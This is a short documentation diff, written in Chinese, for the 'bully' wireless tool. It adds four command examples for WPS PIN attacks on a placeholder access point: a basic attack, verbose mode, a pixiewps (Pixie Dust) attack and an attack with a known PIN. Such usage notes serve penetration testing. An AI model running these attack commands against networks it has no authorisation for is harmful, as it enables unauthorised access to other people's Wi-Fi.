@@ -9,8 +9,17 @@
 
 ## 命令示例
 ```bash
-# 基本用法
-bully [参数]
+# 基本 WPS 攻击
+bully wlan0mon -b 00:11:22:33:44:55 -c 6
+
+# 详细输出
+bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3
+
+# 使用 pixiewps 攻击
+bully wlan0mon -b 00:11:22:33:44:55 -c 6 -d
+
+# 使用已知 PIN
+bully wlan0mon -b 00:11:22:33:44:55 -c 6 -p 12345670
 ```
 
 ## 使用场景
